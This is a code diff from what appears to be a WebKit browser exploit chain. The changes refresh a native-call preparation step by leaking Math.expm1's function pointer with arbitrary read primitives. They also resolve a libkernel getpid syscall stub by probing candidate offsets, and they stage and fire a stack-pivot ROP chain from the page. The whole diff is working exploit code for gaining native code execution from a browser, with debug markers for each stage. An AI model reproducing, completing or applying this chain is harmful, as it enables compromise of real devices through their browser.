@@ -63,7 +63,8 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830u";
+const BUILD_ID = "rw-20250830v";
+let lkHot = false;
 const SS_NATIVE_MODE = "wk-native-mode";
 /** Auto-fire at PRIMITIVE-OK — #native-mode dropdown. Default off (fire kills tab if lk/pivot wrong). */
 function getNativeMode() {
@@ -672,8 +673,58 @@ function logExtPtrDiag(ptrDiag) {
     }
 }
 
+/** Drop log/retain noise before native fire (2e leaves heavy heap). */
+function trimBeforeNativeFire() {
+    if (lines.length > 16) lines.splice(0, lines.length - 16);
+    while (retained.length > 24) retained.shift();
+    try {
+        if (window._wkCarrier && window._wkCarrier.textarea)
+            retained.push(window._wkCarrier.textarea);
+    } catch (_) { }
+}
+
+/** Fresh slab + expm1 capture — stale prep after 2e OOMs on pivot. */
+function refreshNativePrepBeforeFire(p, off) {
+    const wb = (nativePrep && nativePrep.webkitBase)
+        || basesFromSession(off).webkitBase;
+    if (!wb) throw new Error("no webkitBase");
+    const cell = p.leakval(Math.expm1);
+    const jfn = p.read8(cell.add32(0x18));
+    const mainMf = jfn.add32(off.wk_JSFunction_m_function || 0x28);
+    const mainOrig = p.read8(mainMf);
+    if (!mainOrig) throw new Error("nativeFn read failed");
+    const pivotObj = {};
+    const pivotCell = p.leakval(pivotObj);
+    nativePrep = prepNativeChain(p, off, wb, {
+        mainMf, mainOrig, pivotObj, pivotCell,
+    });
+    nativePrep.keepAlive.push(pivotObj);
+    pinNativeRetain();
+    mark("NATIVE-REP", "fresh slab for fire (post-2e safe)");
+}
+
+/** One read @ lk+off — pick getpid stub like chain_poops (k_stubs[20] first). */
+function resolveGetpidStubOff(p, lk, off) {
+    const cands = [];
+    if (off.k_stubs && off.k_stubs[SYS_GETPID] != null)
+        cands.push(["k_stubs[20]", off.k_stubs[SYS_GETPID]]);
+    if (off.k_getpid_syscall != null)
+        cands.push(["k_getpid_syscall", off.k_getpid_syscall]);
+    cands.push(["0x4fa", 0x4fa]);
+    for (let i = 0; i < cands.length; i++) {
+        const tag = cands[i][0];
+        const stubOff = cands[i][1];
+        const v = read8p(p, lk.add32(stubOff));
+        if (lkIsGetpidStub(v))
+            return { off: stubOff, tag: tag };
+    }
+    const fallback = (off.k_stubs && off.k_stubs[SYS_GETPID]) || 0x2cb70;
+    return { off: fallback, tag: "blind" };
+}
+
 /** lk resolved on live primitive — no reload before native fire. */
 function onLkFoundHot(lk, hit) {
+    lkHot = true;
     const iatRva = hit && hit.iatRva != null ? hit.iatRva : null;
     saveLibkernelSession(lk, iatRva, { forced: true });
     if (addrIn) addrIn.value = String(lk);
@@ -3499,9 +3550,11 @@ function tryNativeFireAtStart(p, off) {
             return;
         }
         if (nm === "getpid") {
-            mark("NATIVE-FIRE", "getpid @ PRIMITIVE-OK lk=" + lk);
+            const stub = resolveGetpidStubOff(p, lk, off);
+            mark("NATIVE-FIRE", "getpid @ PRIMITIVE-OK lk=" + lk
+                + " stub+0x" + stub.off.toString(16));
             renderOut();
-            stageGetpid(p, nativePrep, lk, off);
+            stageGetpid(p, nativePrep, lk, off, stub.off);
             fireNativeCall(p, nativePrep);
             mark("NATIVE-OK", "getpid @ Start lk=" + lk + " build=" + BUILD_ID);
         } else {
@@ -3592,19 +3645,24 @@ function runFireGetpid() {
         renderOut();
         return;
     }
-    if (!nativePrep) {
-        try {
-            ensureNativePrep(p, off);
-        } catch (err) {
-            mark("NATIVE-FAIL", "prep: " + (err.message || String(err)));
-            renderOut();
-            return;
-        }
-    }
 
     busy = true;
     nativeQuiet = true;
     lkQuiet = true;
+
+    try {
+        trimBeforeNativeFire();
+        refreshNativePrepBeforeFire(p, off);
+    } catch (prepErr) {
+        busy = false;
+        nativeQuiet = false;
+        lkQuiet = false;
+        mark("NATIVE-FAIL", "prep: " + (prepErr.message || String(prepErr)));
+        state("native prep failed", "bad");
+        renderOut();
+        return;
+    }
+
     pinNativeRetain();
 
     let errMsg = null;
@@ -3616,7 +3674,10 @@ function runFireGetpid() {
         } else if (nm === "usleep") {
             pid = fireUsleep(p, nativePrep, lk, off, 1000);
         } else {
-            stageGetpid(p, nativePrep, lk, off);
+            const stub = resolveGetpidStubOff(p, lk, off);
+            mark("NATIVE-STUB", "getpid @ lk+0x" + stub.off.toString(16)
+                + " (" + stub.tag + ")");
+            stageGetpid(p, nativePrep, lk, off, stub.off);
             pid = fireNativeCall(p, nativePrep);
         }
     } catch (err) {
@@ -3643,8 +3704,10 @@ function runFireGetpid() {
         state("getpid OK pid=" + pid, "ok");
     } else {
         mark("NATIVE-FAIL", (errMsg || "fire failed") + " build=" + BUILD_ID);
+        mark("NATIVE-HINT", "try native: smoke first — OOM with lk ok = bad stub/pivot");
         state("native fire failed", "bad");
     }
+    lkHot = false;
     pivotReady = true;
     setUi();
     renderOut();
